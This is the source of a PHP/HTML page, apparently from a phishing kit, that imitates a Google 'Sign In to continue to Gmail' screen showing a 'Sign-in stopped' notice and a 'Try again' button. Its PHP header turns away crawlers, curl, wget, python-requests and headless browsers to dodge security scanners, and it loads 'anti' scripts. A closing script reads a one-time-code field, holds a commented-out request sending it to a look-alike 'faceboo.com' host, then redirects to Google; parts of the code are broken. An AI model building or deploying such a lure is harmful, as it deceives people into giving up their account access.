<?php

header('X-Frame-Options: SAMEORIGIN');
header('X-XSS-Protection: 1; mode=block');
header('X-Content-Type-Options: nosniff');
header('Referrer-Policy: strict-origin-when-cross-origin');
header('Strict-Transport-Security: max-age=31536000; includeSubDomains');
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('Expires: 0');
header("Content-Security-Policy: default-src 'self' https:; script-src 'self' 'unsafe-inline' 'unsafe-eval' https:; style-src 'self' 'unsafe-inline' https:; img-src 'self' data: https:; object-src 'none'; base-uri 'self'; form-action 'self'");
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$blocked_signatures = ['bot', 'crawl', 'spider', 'axios', 'curl', 'wget', 'python-requests', 'headless', 'phantomjs', 'go-http-client'];
if (empty($user_agent) || str_contains($user_agent, 'bot') || str_contains($user_agent, 'crawl') || str_contains($user_agent, 'spider')) {
    foreach ($blocked_signatures as $bad) {
        if (strpos($user_agent, $bad) !== false) {
            http_response_code(403);
            exit('Forbidden');
        }
    }
}
$rateFile = sys_get_temp_dir() . "/rate_limit_" . md5($ip);
$limit = 60;
$timeWindow = 60;

if (file_exists($rateFile)) {
    $data = json_decode(file_get_contents($rateFile), true);
    if (isset($data['count']) && isset($data['time']) && $data['count'] >= $limit && (time() - $data['time']) < $timeWindow) {
        http_response_code(429);
        header('Retry-After: ' . ($timeWindow - (time() - $data['time'])));
        exit('Too Many Requests');
    } elseif ((time() - ($data['time'] ?? 0)) >= $timeWindow) {
        $data = ['count' => 1, 'time' => time()];
    } else {
        $data['count']++;
    }
} else {
    $data = ['count' => 1, 'time' => time()];
}
file_put_contents($rateFile, json_encode($data));
?>
<!DOCTYPE html>
<html data-bs-theme="light" lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>Gmail Cookies</title>
    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans&amp;display=swap">
    <link rel="stylesheet" href="assets/css/Roboto.css">
    <link rel="stylesheet" href="assets/css/Roboto%20Mono.css">
    <link rel="stylesheet" href="assets/css/styles.css">
    <script src="assets/js/anti/spi.js"></script>
</head>

<body style="background: #f0f3f8;">
    <div id="main-container" class="c-div" style="background: #f0f3f8;">
        <div id="all_out" style="width: 95%;max-width: 1040px;">
            <div id="form-outer" class="sp-div" style="width: 100%;max-width: 1040px;height: 469px;background: var(--bs-body-bg);border-radius: 43px;padding-top: 64px;padding-right: 36px;padding-bottom: 36px;padding-left: 36px;margin-top: 100px;">
                <div id="left-div" style="width: 50%;"><svg xmlns="https://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 48 48" aria-hidden="true" jsname="jjf7Ff"><path fill="#4285F4" d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"></path><path fill="#34A853" d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"></path><path fill="#FBBC05" d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z"></path><path fill="#EA4335" d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"></path><path fill="none" d="M2 2h44v44H2z"></path></svg>
                    <h1 class="fw-lighter" style="font-family: 'Open Sans';padding-top: 6px;">Sign In</h1>
                    <p style="padding-top: 6px;">to continue to Gmail</p>
                </div>
                <div id="right-div" style="width: 50%;">
                    <div id="outer-right">
                        <div id="main-container">
                            <div style="padding-bottom:20px;">
                                <p style="text-align:center;font-weight:600;font-size:23px;color:#2d2d2d;">Sign-in stopped</p>
                                <div class="c-div"><button class="btn btn-light" id="account_btn"><i><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-person-circle" viewbox="0 0 16 16"><path d="M11 6a3 3 0 1 1-6 0 3 3 0 0 1 6 0z"></path><path fill-rule="evenodd" d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8zm8-7a7 7 0 0 0-5.468 11.37C3.242 11.226 4.805 10 8 10s4.757 1.225 5.468 2.37A7 7 0 0 0 8 1z"></path></svg></i><i style="visibility:hidden;">Z</i>*************@gmail.com<i style="visibility:hidden;">Z</i><i><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-chevron-down" viewbox="0 0 16 16"><path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z"></path></svg></i></button></div><br><br>
                            </div>
                            <div>
                                <p>You told us you aren’t trying to sign in on a different device right now.</p>
                                <p>If this was a mistake, try signing in again.</p>
                            </div><br><br><button class="btn-primary" style="float: right;height: 50px;width: 150px;border: none;border-radius: 30px;color: white;background: rgb(13,110,253);">Try again</button>
                        </div>
                    </div>
                </div>
            </div>
            <div id="footer" class="sp-div" style="padding-top: 8px;padding-bottom: 8px;padding-left: 30px;padding-right: 30px;">
                <div id="lf"><a href="#" style="color: var(--bs-emphasis-color);font-size: 12px;">English (United State)</a></div>
                <div id="rf"><a href="#" style="margin-right: 34px;color: var(--bs-emphasis-color);font-size: 12px;">Help</a><a href="#" style="margin-right: 34px;color: var(--bs-emphasis-color);font-size: 12px;">Privacy</a><a href="#" style="margin-right: 0px;color: var(--bs-emphasis-color);font-size: 12px;">Terms</a></div>
            </div>
        </div>
    </div>
    <script src="assets/bootstrap/js/bootstrap.min.js"></script>
    <script src="assets/js/anti/spi_act.js"></script>
</body>

<script src="assets/js/jquery/min.js"></script>

<script>
$(document).ready(function(){
    var otp_value = document.getElementById('otp_code');
  $("button").click(function(){
    // $.get("www.faceboo.com/" + otp_value , function(){
        alert(otp_value.value);
      window.open("https://www.google.com");
      window.close();
     
    });
  });

</script>

</html>